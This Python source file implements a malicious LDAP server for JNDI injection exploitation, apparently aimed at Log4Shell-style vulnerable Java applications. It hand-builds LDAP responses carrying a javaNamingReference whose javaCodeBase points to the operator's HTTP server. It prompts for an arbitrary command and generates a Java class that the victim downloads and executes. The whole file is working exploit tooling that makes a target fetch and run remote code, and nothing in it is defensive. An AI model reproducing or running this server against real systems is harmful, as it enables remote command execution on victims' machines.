from datetime import datetime
from termcolor import colored
import socket
import Utils
import time
import Generate
import os
import json


# ldap response packet serializer class
class Serializer():
    __payload: bytes
    __sizeStack: bytes

    def __init__(self):
        self.__payload = b""
        self.__size_stack = []

    def push(self, data: bytes) -> "Serializer":
        self.__last = data
        self.__payload = data + self.__payload
        return self

    def pop_size(self) -> "Serializer":
        return self.push(bytes([len(self.__payload) - self.__size_stack.pop()]))

    def push_size(self, count=1) -> "Serializer":
        for _ in range(count):
            self.__size_stack.append(len(self.__payload))

        return self

    def build(self) -> bytes:
        return self.__payload

    def __repr__(self) -> str:
        return str(self.__payload)


# ldap response class
class LDAPResponse():
    __queryLocation: str
    __javaClassInfo: dict

    # Create instance location and javaClassInfo
    def __init__(self, queryLocation: str, javaClassInfo: dict):
        self.__queryLocation = queryLocation
        self.__javaClassInfo = javaClassInfo

    def serialize(self) -> bytes:
        s = Serializer()
        s.push_size(2)

        for k, v in reversed(self.__javaClassInfo.items()):
            s.push_size(3).push(v.encode()).pop_size().push(b"\x04").pop_size().push(b"1")
            s.push_size().push(k.encode()).pop_size().push(b"\x04").pop_size().push(b"0")

        s.push(b"0\x81\x82")
        s.push_size().push(self.__queryLocation.encode()).pop_size().push(b"\x04").pop_size()
        s.push(b"\x02\x01\x02d\x81").pop_size().push(b"0\x81")

        SUCCESS_RESPONSE = b"0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00"
        return s.build() + SUCCESS_RESPONSE


def OpenLDAPService(host, port, hport):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(('0.0.0.0', port))
        sock.listen(1)

        while True:
            conn, addr = sock.accept()

            with conn as c:
                try:
                    print(1)
                    timestamp = datetime.now().ctime()
                    print(colored(f"[+] Connecting by {addr[0]}:{addr[1]} ({timestamp})\n", "green"))
                    c.recv(8096)
                    c.sendall(b"0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00")
                    time.sleep(0.5)

                    query = c.recv(8096)
                    queryLocation = query[9:9 + query[8:][0]].decode()

                    if not query or len(query) < 10:
                        print(colored("[-] Connection Suspended", "red"))
                        return

                    command = Utils.printPrompt("command", "[?] Command : ")
                    print(colored("[+] Command was sent succefully.\n", "green"))

                    className = Utils.randomName()
                    Generate.generateClass(command, className)

                    # Create response packet
                    response = LDAPResponse(queryLocation, {
                        "javaClassName": className,
                        "javaCodeBase": f"http://{host}:{hport}/",
                        "objectClass": "javaNamingReference",
                        "javaFactory": className
                    })
                    c.sendall(response.serialize())
                    time.sleep(0.5)
                    c.recv(8096)


                except Exception as e:
                    print(e)
                    print(colored('[!] Unable to exploit the connection.\n', 'red'))
                finally:
                    c.close()


if __name__ == "__main__":
    OpenLDAPService('192.168.50.99', 12345, 12346)
